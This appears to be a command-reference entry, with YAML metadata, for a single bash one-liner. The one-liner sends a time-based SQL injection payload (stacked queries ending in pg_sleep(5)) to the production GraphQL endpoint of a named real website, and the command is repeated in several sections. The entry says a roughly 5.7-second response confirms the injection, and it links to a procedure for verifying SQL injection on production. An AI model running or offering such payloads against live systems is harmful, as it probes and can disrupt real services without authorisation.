---
data: >-
  time curl -X POST
  https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%285%29%3B--%27
tags:
  - sqli
  - timing
type: command
output: 'Response time ~5.726 seconds with {} JSON'
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:00.288Z'
id: 44e0763c-67e1-48cf-9277-95844c157558
verified: false
validated: true
submitted: true
---
# time-curl-prod-5s

## Command

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%285%29%3B--%27
```

## Description

Times a production GraphQL request with a 5-second pg_sleep payload for SQL injection verification.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `time` | Measure execution | Yes |
| `curl -X POST` | Send request | Yes |
| `embedded_submission_form_uuid=...` | 5s sleep payload | Yes |

## Examples

### Basic Usage

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%285%29%3B--%27
```

## Expected Output

real 0m5.726s
{} JSON response.

## Related

- [[Related Procedure: Verify-SQL-Injection-on-Production]]
